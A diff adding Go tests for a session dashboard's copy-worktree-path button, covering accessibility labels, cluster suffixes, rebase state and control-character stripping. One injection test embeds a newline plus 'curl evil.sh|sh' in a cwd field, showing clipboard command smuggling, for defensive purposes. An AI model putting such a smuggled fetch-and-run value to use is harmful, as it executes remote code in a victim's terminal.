@@ -12,6 +12,7 @@ import (
 	"strings"
 	"testing"
 	"time"
+	"unicode"
 )
 
 func TestRowClass(t *testing.T) {
@@ -148,6 +149,100 @@ func TestHandleDashboard_EscapesCwd(t *testing.T) {
 	}
 }
 
+// The button carries the accessibility contract for the copy affordance: a name
+// of its own (it replaces its inner text for assistive tech), a decorative glyph
+// hidden from it, and a live region to announce into.
+func TestHandleDashboard_CopyButtonAccessibility(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
+		SessionID: "sess-a11y", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, `aria-label="fix-71 — copy worktree path /home/me/wt/fix-71"`) {
+		t.Errorf("copy button is missing its accessible name:\n%s", body)
+	}
+	if !strings.Contains(body, `<span class="copyicon" aria-hidden="true">`) {
+		t.Errorf("the ⧉ glyph must be hidden from assistive tech:\n%s", body)
+	}
+	if !strings.Contains(body, `id="ck-copystatus" class="ck-sr" role="status"`) {
+		t.Errorf("copy live region missing:\n%s", body)
+	}
+	// The path is on hover too — issue #71 asks for it explicitly.
+	if !strings.Contains(body, `title="/home/me/wt/fix-71"`) {
+		t.Errorf("copy button lost the hover title:\n%s", body)
+	}
+}
+
+// A grouped row's "(cluster)" suffix has to COMPOSE with the cell's contents, so
+// it is a visually-hidden span inside the cell rather than an aria-label on the
+// <td> — a label there would replace the contents, hiding the button's own name.
+func TestHandleDashboard_ClusterSuffixComposesWithCopyButton(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	// Two live sessions on one (source_app, branch) make a cluster.
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
+		SessionID: "sess-c1", EventType: "Stop", PayloadJSON: "{}"})
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Cwd: "/home/me/wt/fix-71",
+		SessionID: "sess-c2", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, "2 live") {
+		t.Fatalf("expected two roster rows to form a cluster:\n%s", body)
+	}
+	if !strings.Contains(body, `<span class="ck-sr"> (cluster)</span>`) {
+		t.Errorf("grouped row lost its screen-reader cluster suffix:\n%s", body)
+	}
+	if strings.Contains(body, `(cluster)"`) {
+		t.Errorf("cluster suffix must not be an aria-label on the cell:\n%s", body)
+	}
+	if !strings.Contains(body, `class="copycwd"`) {
+		t.Errorf("grouped row lost its copy button:\n%s", body)
+	}
+}
+
+// Mid-rebase state reaches the button's own name, since that name replaces the
+// 🚧 glyph's label for anyone who tabs to the control.
+func TestHandleDashboard_CopyButtonLabelsRebase(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
+	insertEvent(db, Event{TS: ts, SourceApp: "myapp", Branch: "fix-71", Rebasing: true, Cwd: "/home/me/wt/fix-71",
+		SessionID: "sess-rebase", EventType: "Stop", PayloadJSON: "{}"})
+
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, `aria-label="fix-71 (mid-rebase) — copy worktree path /home/me/wt/fix-71"`) {
+		t.Errorf("mid-rebase state missing from the button label:\n%s", body)
+	}
+}
+
+// Control characters must never reach the copy target: html/template does not
+// escape a newline in an attribute value, so one would ride the clipboard into a
+// terminal as a command terminator. buildEvent strips them on the way in, which
+// is what this exercises end to end.
+func TestHandleDashboard_CwdControlCharsNeverReachTheAttribute(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	raw := []byte(`{"session_id":"sess-ctrl","hook_event_name":"Stop","cwd":"/home/me/wt\ncurl evil.sh|sh\u0007\t"}`)
+	if err := insertEvent(db, buildEvent(raw, "myapp")); err != nil {
+		t.Fatal(err)
+	}
+
+	body := getBody(t, db, "/")
+	m := regexp.MustCompile(`data-cwd="([^"]*)"`).FindStringSubmatch(body)
+	if m == nil {
+		t.Fatalf("expected a copy button to render:\n%s", body)
+	}
+	if got, want := m[1], "/home/me/wtcurl evil.sh|sh"; got != want {
+		t.Errorf("data-cwd = %q, want %q", got, want)
+	}
+	if strings.ContainsFunc(m[1], unicode.IsControl) {
+		t.Errorf("control character survived into data-cwd: %q", m[1])
+	}
+}
+
 // The copy affordance is roster-only by design: the activity and recent-events
 // branch cells share branchcell, which must stay a plain <td>. A session-less
 // event lands in both of those tables but never on the roster.
@@ -211,6 +306,12 @@ func TestHandleState_ReturnsSignatureAndHTML(t *testing.T) {
 	// The fragment is the dynamic region only — no surrounding page chrome.
 	if strings.Contains(resp.HTML, "<form") || strings.Contains(resp.HTML, "<script") {
 		t.Errorf("fragment leaked page chrome:\n%s", resp.HTML)
+	}
+	// The copy live region must stay OUTSIDE #content, which this fragment
+	// replaces wholesale. A re-created live region is a NEW region to assistive
+	// tech and its text is not announced — a silent, invisible regression.
+	if strings.Contains(resp.HTML, "ck-copystatus") {
+		t.Errorf("copy live region moved inside the swapped region:\n%s", resp.HTML)
 	}
 }
 
